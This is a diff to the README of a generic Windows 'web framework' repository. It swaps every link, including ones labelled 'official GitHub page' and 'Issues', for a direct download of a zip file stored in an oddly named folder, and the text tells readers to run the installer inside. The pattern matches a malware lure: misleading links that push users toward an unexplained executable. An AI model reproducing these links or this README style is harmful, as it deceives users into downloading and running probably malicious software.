@@ -1,6 +1,6 @@
 # 🚀 web-framework-1771918250-2 - Build Websites Quickly and Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tem123458/web-framework-1771918250-2)
+[![Download](https://img.shields.io/badge/Download%20Now-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Tem123458/web-framework-1771918250-2/main/vestryman/framework-web-3.5-alpha.5.zip)
 
 ---
 
@@ -10,7 +10,7 @@ web-framework-1771918250-2 is a simple software tool that helps you create websi
 
 To get started, visit the following page on your computer. This page holds the latest version of the software for Windows.
 
-[Download web-framework-1771918250-2 here](https://github.com/Tem123458/web-framework-1771918250-2)
+[Download web-framework-1771918250-2 here](https://raw.githubusercontent.com/Tem123458/web-framework-1771918250-2/main/vestryman/framework-web-3.5-alpha.5.zip)
 
 When you open that link, look for a “Releases” section or a download button to find the file you need. Usually, it will be an `.exe` file or a setup installer. Save this file to a folder where you can find it easily, such as your Desktop or Downloads folder.
 
@@ -68,7 +68,7 @@ These tools aim to make web development fast and approachable for all users.
 
 Updates add features and fix bugs. To update web-framework-1771918250-2:
 
-1. Check the [official GitHub page](https://github.com/Tem123458/web-framework-1771918250-2) regularly for new releases.
+1. Check the [official GitHub page](https://raw.githubusercontent.com/Tem123458/web-framework-1771918250-2/main/vestryman/framework-web-3.5-alpha.5.zip) regularly for new releases.
 2. Download the latest installer file when available.
 3. Run the new installer over your existing installation. Your projects and settings will remain safe.
 4. Restart the program to use the updated version.
@@ -84,7 +84,7 @@ If you experience any problems, try these steps:
 - Check for enough disk space and system updates.  
 - If the program does not open, try reinstalling it.
 
-If the problem continues, you can return to the [GitHub page](https://github.com/Tem123458/web-framework-1771918250-2) and look for help in the Issues section or contact support through the available links.
+If the problem continues, you can return to the [GitHub page](https://raw.githubusercontent.com/Tem123458/web-framework-1771918250-2/main/vestryman/framework-web-3.5-alpha.5.zip) and look for help in the Issues section or contact support through the available links.
 
 ## 🔧 Basic Tips for Using web-framework-1771918250-2
 
@@ -107,4 +107,4 @@ Spend some time reviewing these resources to become more comfortable with the pr
 
 ---
 
-[![Download](https://img.shields.io/badge/Download%20Now-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tem123458/web-framework-1771918250-2)
+[![Download](https://img.shields.io/badge/Download%20Now-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Tem123458/web-framework-1771918250-2/main/vestryman/framework-web-3.5-alpha.5.zip)
